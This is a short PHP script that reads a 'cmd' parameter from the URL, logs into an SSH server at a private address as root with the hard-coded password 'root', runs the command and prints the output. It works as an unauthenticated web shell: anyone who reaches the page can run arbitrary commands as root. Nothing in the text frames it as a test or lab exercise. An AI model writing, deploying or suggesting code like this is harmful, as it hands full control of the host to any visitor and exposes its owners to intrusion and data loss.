<?php
set_include_path(get_include_path() . PATH_SEPARATOR . '../phpseclib1.0.20');

include 'Net/SSH2.php';

$cmd = $_GET['cmd'];

$ssh = new Net_SSH2('172.28.224.1', 2222);
if (!$ssh->login('root', 'root')) {
    exit('Login Failed');
}

echo $ssh->exec($cmd);